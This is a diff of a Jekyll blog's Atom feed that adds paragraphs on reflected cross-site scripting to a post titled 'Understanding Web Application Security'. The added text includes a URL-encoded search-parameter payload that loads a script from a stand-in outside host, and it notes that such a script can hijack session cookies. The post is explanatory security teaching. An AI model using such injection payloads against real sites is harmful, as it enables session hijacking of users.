@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-09-13T19:17:33+03:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js, Ruby on Rails and .NET stacks.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-09-13T19:43:49+03:00</updated><id>http://localhost:4000/</id><title type="html">achiral</title><subtitle>achiral offers consulting and custom software development services on the node.js, Ruby on Rails and .NET stacks.
 </subtitle><entry><title type="html">Understanding Web Application Security</title><link href="http://localhost:4000/web-security" rel="alternate" type="text/html" title="Understanding Web Application Security" /><published>2017-09-13T09:39:37+03:00</published><updated>2017-09-13T09:39:37+03:00</updated><id>http://localhost:4000/web-security</id><content type="html" xml:base="http://localhost:4000/web-security">&lt;p&gt;I can testify that a lot of people confined in me they considered doing this (including your’s truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/my-password.jpg&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
@@ -32,6 +32,25 @@
 &lt;p&gt;A typical example of XSS is &lt;em&gt;persistent cross-site scripting&lt;/em&gt;. If a page isn’t properly &lt;em&gt;sanitizing&lt;/em&gt; the user input (a field in a for, for example), a user could actually type in valid Javascript code, which is going to be saved by the application in its database and be subsequently rendered everytime it displays a page. Imagine you have a page that is visible to multiple users (such as a product page) which allows for users to add comments. If the page is not escaping user input, it is possible for a malicious user to write actual an script block, which will then be rendered to all users as part of the page HTML. The Javascript code has access to the cookies of that user and it can send that information to the a attacker.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/attack.gif&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;An alternative is the &lt;em&gt;reflected&lt;/em&gt; (or non-persistent) XSS atack, whereby the user’s input is not stored in the database, but returned back in the same way it was inputed. It works like this: say you have a page that allows you to search for products. The user types some text in the search box and clicks the search button which sends a GET request to the server.&lt;/p&gt;
+
+&lt;pre&gt;
+GET http://www.onlineshop.com?search=something
+&lt;/pre&gt;
+
+&lt;p&gt;If the site finds something, it returns a list of results, but if it doesn’t, it’s going to say&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Your search, ‘something’, returned no results.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;… which is just the original, unaltered string. A crafty attacker might see this vulnerability and might send an email to the user asking him to click on a link which for the search term, contains some nefarious script block. If the user clicks on the link (which is likely because most people don’t hover on links to see where they lead to), the application server won’t be able to find any result, and will return with a &lt;em&gt;not found&lt;/em&gt; page containing the script rendered directly on the page.&lt;/p&gt;
+
+&lt;pre&gt;
+GET http://www.onlineshop.com?
+  search=%3Cscript%2520src%3D%22http%3A%2F%2Fsomesite.com%2Fscript.js%22%3E%3C%2Fscript%3E
+&lt;/pre&gt;
+
+&lt;p&gt;This script can then hijack the session cookie, like in the previous example.&lt;/p&gt;
 
 &lt;p&gt;What can we do about it? Actually two things:&lt;/p&gt;
 
